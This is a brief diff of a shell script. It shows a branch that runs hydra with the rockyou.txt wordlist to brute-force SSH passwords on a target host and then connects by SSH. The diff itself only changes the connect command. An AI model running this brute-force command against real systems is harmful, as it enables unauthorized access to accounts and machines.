@@ -47,7 +47,7 @@ function run() {
         open vnc://$host
     else
         hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
-        open ssh $user@$host
+        ssh $user@$host
     fi
 }
 run
